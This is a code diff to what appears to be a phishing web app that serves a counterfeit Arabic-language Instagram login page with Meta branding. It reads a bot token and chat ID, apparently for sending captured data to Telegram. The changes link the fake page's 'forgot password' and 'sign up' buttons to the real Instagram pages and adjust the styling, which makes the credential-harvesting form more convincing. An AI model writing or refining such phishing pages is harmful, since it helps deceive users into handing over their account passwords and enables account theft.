@@ -10,6 +10,8 @@ BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
 INSTAGRAM_OFFICIAL_URL = "https://www.instagram.com/accounts/login/"
+INSTAGRAM_SIGNUP_URL = "https://www.instagram.com/accounts/emailsignup/"
+INSTAGRAM_FORGOT_URL = "https://www.instagram.com/accounts/password/reset/"
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
@@ -75,7 +77,7 @@ def insta_login():
         .submit-btn:hover { background: #1877f2; }
         .forgot-pass { color: #f5f5f5; font-size: 12px; text-decoration: none; display: block; margin-top: 4px; font-weight: 400; }
         .footer-area { width: 100%; text-align: center; display: flex; flex-direction: column; align-items: center; }
-        .signup-card { padding: 12px; width: 100%; border: 1px solid #262626; border-radius: 8px; text-align: center; font-size: 14px; color: #0095f6; font-weight: 600; cursor: pointer; margin-bottom: 10px; }
+        .signup-card { padding: 12px; width: 100%; border: 1px solid #262626; border-radius: 8px; text-align: center; font-size: 14px; color: #0095f6; font-weight: 600; cursor: pointer; margin-bottom: 10px; text-decoration: none; display: block; }
         .meta-footer { display: flex; align-items: center; justify-content: center; }
         .meta-brand { font-size: 13px; font-weight: 600; color: #737373; letter-spacing: 0.5px; }
     </style>
@@ -117,11 +119,11 @@ def insta_login():
                 </div>
                 <button type="submit" class="submit-btn">تسجيل الدخول</button>
             </form>
-            <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+            <a href="https://www.instagram.com/accounts/password/reset/" target="_blank" class="forgot-pass">هل نسيت كلمة السر؟</a>
         </div>
 
         <div class="footer-area">
-            <div class="signup-card">إنشاء حساب جديد</div>
+            <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank" class="signup-card">إنشاء حساب جديد</a>
             <div class="meta-footer">
                 <div class="meta-brand">Meta ∞</div>
             </div>
